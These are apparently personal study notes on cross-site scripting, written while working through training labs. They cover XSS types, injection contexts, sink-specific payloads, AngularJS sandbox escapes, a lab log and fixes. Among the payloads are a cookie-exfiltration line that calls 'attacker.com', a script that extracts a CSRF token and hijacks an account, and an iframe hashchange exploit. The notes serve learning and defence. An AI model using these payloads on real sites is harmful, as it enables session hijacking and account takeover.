# Cross-Site Scripting (XSS)

## What is it

When an app takes user input and puts it into a page without sanitizing it, letting you inject a script that runs in another user's browser.

## Why it works

The browser can't tell the difference between the site's legitimate JavaScript and yours. If your input ends up in the HTML unescaped, the browser just executes it.

---

## The three types

### Reflected XSS

The payload is in the URL. The attacker sends the victim a crafted link and the server reflects it back in the response.

**The catch:** the attacker is praying the victim is logged in when they click. No guarantee. It's a shot in the dark send the link and hope.

### Stored XSS

The payload gets saved in the database (comment, profile field, post) and fires every time someone loads that page.

**Why it's worse:** the attacker already knows users are going to see it. They're logged in by definition  they're browsing the site. No praying required. More reliable, more dangerous.

### DOM XSS

The vulnerability lives in client-side JavaScript, not the server. The page's own JS reads from something attacker-controlled (like `location.search`) and writes it into the DOM unsafely.

The DOM is the browser's live representation of the HTML issued by the server a tree structure built after all JS has run. In DOM XSS you're not manipulating the original HTML file like in stored XSS. You're manipulating the DOM directly through the browser's own JS.

- **Ctrl+U** → original HTML the server sent, JS hasn't run yet
- **Inspect Element** → the live DOM after JS has modified everything

---

## Source and Sink

Every DOM XSS has two parts:

- **Source** - where attacker-controlled input comes from (e.g. `location.search`, `location.hash`, `document.cookie`)
- **Sink** - where that input ends up being executed or rendered (e.g. `document.write`, `innerHTML`, `eval`, `$()`)

The vulnerability exists when there's a path from source to sink with no sanitization in between. The sink determines what payload you use, different sink, different approach, same thinking.

---

## The mental model for every DOM XSS lab

1. Find the source - where is input coming from?
2. Find the sink - where does it end up?
3. Identify the context - what's wrapping your input in the DOM?
4. Close everything wrapping you
5. Inject

---

## XSS Contexts

The context is where your input lands in the page. It determines everything - what characters matter, what you need to break out of, and what payload works. Same vulnerability, completely different approach depending on context.

The core logic: every context has a "language" the browser is currently parsing. Your job is to break out of that language's current structure, then inject something the browser will execute. One approach does not fit all - you have to read the context first.

### Between HTML tags

Your input lands as raw content between tags. The browser is in HTML parsing mode - it's looking for tags and entities.

Nothing is wrapping you so no breakout needed. Just inject a tag directly.

```
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
```

Why different tags work: the browser executes `<script>` blocks, but also runs event handlers on any element. `img` with a broken `src` fires `onerror` immediately. Useful when `<script>` is filtered.

### Inside an HTML attribute value

Your input lands as the value of an attribute. The browser is parsing an attribute string - it's looking for the closing quote, not for tags.

Tags injected here don't break out because the browser doesn't treat `<` as special inside an attribute value it's just a character. You have to close the attribute and the tag first, then inject.

```
// input lands in: <input value="YOUR_INPUT">
// payload:
"><script>alert(1)</script>
```

Close the quote → close the tag → now you're back in HTML context → inject freely.

**Exception - event handler attributes:** if your input lands directly inside an existing event handler like `onmouseover=""`, you're already in a JavaScript execution context. No breakout needed, just write JS directly.

```
// input lands in: <input onmouseover="YOUR_INPUT">
// payload:
alert(1)
```

**Exception - href and src attributes:** these accept URLs. Breaking out with `">` works but there's a cleaner path - `javascript:` protocol. Browser executes the JS when the link is clicked.

```
javascript:alert(1)
```

Only works on navigating attributes (href, action, iframe src). Not img src - that fetches a resource, doesn't execute JS.

### Inside a JavaScript string

Your input lands inside an existing JS string, inside a `<script>` block. The browser is already in JavaScript parsing mode - it's not looking for HTML tags at all.

Injecting `<script>` or HTML tags does nothing here. You have to break out of the string, close the script block or just execute JS directly.

```
// input lands in: var search = 'YOUR_INPUT';
// payload:
'-alert(1)-'
// or:
';alert(1)//
```

First option: close the string with `'`, inject JS, reopen the string so the rest doesn't error. Second option: terminate the statement, inject, comment out the rest.

**When angle brackets are encoded:** if `<` and `>` are HTML-encoded, you can't close the `<script>` tag and start fresh. But you're already inside a script block - you don't need to. Just break out of the string and write JS.

```
\'-alert(1)//
```

The backslash escapes the app's escape attempt if the app tries to escape your quote with `\'`, prefixing `\` turns it into `\\` which escapes the backslash itself, leaving your `'` to close the string.

### Inside a JavaScript template literal

Template literals use backticks and support `${}` expressions. Your input lands inside a backtick string.

You don't need to break out at all. `${}` is evaluated as JS inside a template literal by design.

```
// input lands in: var msg = `Hello YOUR_INPUT`;
// payload:
${alert(1)}
```

The browser sees `${}`, evaluates the contents as JavaScript, executes `alert(1)`. No tags, no string breaking, no escaping. The syntax does the work.

---

## Sinks and their payloads

### document.write

Writes raw HTML directly into the page. Browser parses it as real HTML.

- Identify what tags are open around your input
- Close them all, then inject

```
// input lands inside <option selected>HERE</option> inside <select>
// payload:
</option></select><img src=1 onerror=alert(1)>
```

### innerHTML

Same idea as document.write but won't execute `<script>` tags on modern browsers.
Use `<img>` or `<iframe>` with event handlers instead.

```
<img src=1 onerror=alert(1)>
```

### jQuery attr() - href attribute

Sets an HTML attribute value. Input is treated as a URL, not raw HTML so breaking out with tags doesn't work.
Use `javascript:` protocol instead - browsers execute JS when a link with this href is clicked.

```
?returnPath=javascript:alert(document.domain)
```

Only works on attributes that accept URLs that navigate/load pages (href, action, iframe src).
Doesn't work on img src - that just loads a resource.

### jQuery $() - selector sink

jQuery's selector function has two modes:

- Pass a CSS selector → finds existing elements on the page
- Pass an HTML string starting with `<` → creates and injects that element into the DOM

That dual behavior is the vulnerability. If user input reaches `$()` it can inject HTML.

**With hashchange (classic attack):**

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

- Source: `location.hash` (the `#` part of the URL)
- Sink: `$()` which injects HTML if input starts with `<`
- Problem: `hashchange` only fires on change, not on load - can't just send victim a crafted URL
- Solution: deliver via iframe

**Why the iframe:**

```html
<iframe src="https://vulnerable-site.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

1. Iframe loads vulnerable page with empty hash `#`
2. `onload` fires after page fully loads
3. Payload gets appended to hash - hash changes from `#` to `#<img src=1 onerror=alert(1)>`
4. `hashchange` fires on the vulnerable page
5. `$()` receives the hash, sees HTML, injects it into the DOM
6. `onerror` fires, alert executes

The iframe lives on the attacker's page. Victim just visits the attacker's page - the vulnerable site loads invisibly in the background. Stealthier than reflected XSS because no suspicious URL appears in the victim's address bar.

### AngularJS {{}} expression injection

When a page uses `ng-app`, AngularJS takes control of that element and evaluates anything inside `{{}}` as JavaScript.

- Look for `ng-app` attribute in page source (Ctrl+U)
- If your input lands inside an `ng-app` element, inject `{{2+2}}` to confirm - if page renders `4` you have injection
- AngularJS sandboxes direct JS calls like `alert(1)` - need a sandbox escape
- Classic escape using Angular's own internals:

```
{{$on.constructor('alert(1)')()}}
```

- `$on` - an internal Angular function that's accessible
- `.constructor` - every function's constructor is the built-in `Function` object
- `Function('alert(1)')` - builds a new function from a string (same idea as eval)
- `()` - calls it immediately

No angle brackets or event handlers needed - you're injecting an expression, not HTML.

---

## Real-world insight: dead code is dangerous

The `document.write` lab had a URL parameter (`storeId`) that was never used in normal site flow - the stock checker used POST instead. But the JS that reads `storeId` from the URL was still there, forgotten. Dead/orphaned code sitting in production, harmless looking, until someone reads the source carefully.

In real bug bounties this is a common find - developers change approach and forget to clean up old code. The vulnerability isn't in obviously bad code. It's in reasonable features with slightly wrong assumptions.

---

## Why if(store) doesn't protect anything

```javascript
if(store) {
    document.write('<option selected>'+store+'</option>');
}
```

This only checks **does a value exist** - not whether it's valid. A real fix uses whitelist validation:

```javascript
var validStores = ["London","Paris","Milan"];
if(validStores.includes(store)) {
    document.write('<option selected>'+store+'</option>');
}
```

Most injection vulnerabilities exist not because there's zero validation but because the validation checks the wrong thing.

---

## Exploiting XSS

`alert(1)` is proof the bug exists. The real question is what an attacker can actually do with it. The answer is almost always more than the developer thinks.

### Stealing cookies

XSS gives you code execution in the victim's browser. The victim's cookies are sitting right there in `document.cookie`. The attack is just reading that value and sending it somewhere you control.

```javascript
fetch('https://attacker.com/?c='+document.cookie)
```

Inject this as a stored XSS payload in a comment field. Every user who loads the page sends their session cookie to your server. You take the cookie, set it in your browser, you're now them.

**Why HttpOnly blocks this:** if the cookie has the HttpOnly flag, JS can't read it. `document.cookie` won't show it. This is the single most important cookie defense and why you'll often see cookie stealing combined with other techniques.

**Lab solution (understood, Burp Pro needed):** stored XSS in comment field, payload uses fetch to send `document.cookie` to Burp Collaborator, server logs the incoming request containing the victim's session token.

### Stealing passwords via autofill

Browsers autofill saved credentials into username/password fields. If you can inject a hidden form with those field types into the page, the browser fills them in automatically. Your JS then reads the values and exfiltrates them.

The victim doesn't type anything. The browser does the work for you.

**Lab solution (understood, Burp Pro needed):** stored XSS injects a fake form, browser autofills credentials, JS reads the password field value and sends it to Collaborator.

### XSS to CSRF

XSS already gives you code execution as the victim. That means you can make any HTTP request the victim could make, including state-changing ones like changing their email or password.

The difference from regular CSRF: CSRF tokens aren't a defense here. The attacker's JS runs in the victim's browser on the victim's origin, so it can read the page's source, extract the CSRF token, and include it in the forged request. CSRF protection assumes the attacker can't read the page. XSS breaks that assumption.

The attack chain:
1. XSS fires in victim's browser
2. JS makes a GET request to the account settings page
3. Response comes back, JS parses out the CSRF token from the HTML
4. JS makes a POST request to change email, with the real CSRF token included
5. Server accepts it, email changed, attacker takes over account

```javascript
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/name="csrf" value="([^"]+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      body: 'email=attacker@evil.com&csrf=' + token
    });
  });
```

Two requests, fully automated, victim sees nothing.

**Why this matters conceptually:** CSRF tokens protect against cross-origin requests. XSS is same-origin by definition. The token defense is irrelevant once XSS exists. This is why XSS is treated as higher severity than CSRF.

---

## My insights

Reflected vs stored isn't just a technical difference - it's a reliability difference from the attacker's perspective. Reflected is a gamble. Stored is a guarantee. That's why stored is treated as higher severity.

Injection attacks all share the same root cause: the boundary between data and code broke down. The developer's mistake is always the same - trusting user data and mixing it with code without checking it first. SQLi, XSS, command injection - same concept, different context.

Context is everything in XSS. The same payload that works in raw HTML does nothing inside a JS string. The same payload that works in a JS string does nothing inside a template literal - because you don't need it. Each context has its own grammar. You have to speak the browser's language at that exact point in the page, not just throw angle brackets at it and hope.

---

## How to find it

- Try `<script>alert(1)</script>` in any input field
- If alert fires, you have XSS
- In DOM XSS: search source for `document.write`, `innerHTML`, `eval`, `$()` - trace where input flows
- Use Ctrl+F in Sources tab to find sinks
- Add test input to URL, search for it in Elements tab to find where it lands in the DOM
- **For context identification:** send a unique string like `xsstest123`, find it in the DOM, read what surrounds it - that tells you exactly what you need to break out of

---

## How to fix it

- Encode output - convert `<` to `&lt;` so browser treats it as text not code
- Whitelist validation - check input is exactly what you expect, not just that it exists
- Use safe sinks - `textContent` and `innerText` treat input as plain text, never parse as HTML
- Content Security Policy (CSP) as a second layer
- Never trust user input that gets rendered into the page

---

## Labs completed

### Apprentice
- Reflected XSS into HTML context, no encoding - injected `<script>alert(1)</script>` in search, fired immediately
- Stored XSS into HTML context, no encoding - injected payload in comment field, fires on every page load for every visitor
- DOM XSS in `document.write` sink using source `location.search` - input lands in document.write, broke out of surrounding tags, injected img onerror payload
- DOM XSS in `innerHTML` sink using source `location.search` - input lands in innerHTML, used img onerror payload since script tags don't execute there
- DOM XSS in jQuery anchor `href` attribute sink using `location.search` source - input lands in href attribute, used javascript: protocol payload, clicked back link to fire
- DOM XSS in jQuery selector sink using a hashchange event - delivered iframe exploit, chained hashchange event to inject HTML via $() sink
- Reflected XSS into attribute with angle brackets HTML-encoded - angle brackets encoded so no tag breakout, closed the attribute with `"` then injected onmouseover event handler
- Reflected XSS into a JavaScript string with angle brackets HTML-encoded - angle brackets encoded so no new tags, broke out of JS string with `'`, injected alert, commented out remainder with `//`

### Practitioner
- DOM XSS in `document.write` sink using source `location.search` inside a select element - found dead/orphaned code reading storeId from URL that was never used in normal flow, broke out of option and select tags with `</option></select>`, injected img onerror payload
- DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded - found ng-app on page, confirmed injection with `{{2+2}}`, used `{{$on.constructor('alert(1)')()}}` to escape Angular sandbox via Function constructor
- Reflected XSS into HTML context with most tags and attributes blocked - WAF blocking standard tags, used Burp Intruder to fuzz which tags and attributes are allowed, found custom tags with onresize work, delivered via iframe with onload setting width to trigger resize event
- Reflected XSS into HTML context with all tags blocked except custom ones - no standard tags allowed, injected custom tag with tabindex and onfocus, used `#` in URL to autofocus on load and fire the handler
- Reflected XSS with some SVG markup allowed - SVG tags not blocked, used `<svg><animatetransform onbegin=alert(1)>` since animatetransform events aren't standard HTML and slip past naive filters
- Reflected XSS in canonical link tag - input lands in a `<link rel="canonical">` href attribute inside the head, not in the body so no visible element to interact with, used accesskey attribute with a letter and single quotes to inject onclick, accesskey triggers the handler on keyboard shortcut
- Reflected XSS into a JavaScript string with single quote and backslash escaped - app escapes both `'` and `\`, prefixed `\` before the quote which turns app's `\'` into `\\` leaving `'` free to close the string, then closed the script block and opened a new one
- Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped - angle brackets encoded, can't close script tag, single quotes escaped, used `\` to escape the app's backslash and free the quote, broke out of string mid-script-block
- Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped - input lands in onclick handler inside an href attribute, HTML encoding applies so used HTML entity `&apos;` for single quote, browser decodes it before JS runs so the string breaks correctly
- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped - everything escaped except the template literal syntax itself, used `${alert(1)}` directly since template literals evaluate expressions by design, no breakout needed
- Exploiting XSS to perform CSRF - stored XSS in comment field, payload makes a GET to account settings page, parses the CSRF token from the response HTML with a regex match, then fires a POST to change the victim's email with the real token included, CSRF protection bypassed entirely because JS runs same-origin so it can read the page freely


### Theory understood, lab skipped (requires Burp Pro / Collaborator)
- Exploiting XSS to steal cookies - stored XSS payload reads document.cookie and exfiltrates to external server via fetch, session hijack from there
- Exploiting XSS to capture passwords - stored XSS injects hidden form fields, browser autofills saved credentials, JS reads the values and sends them out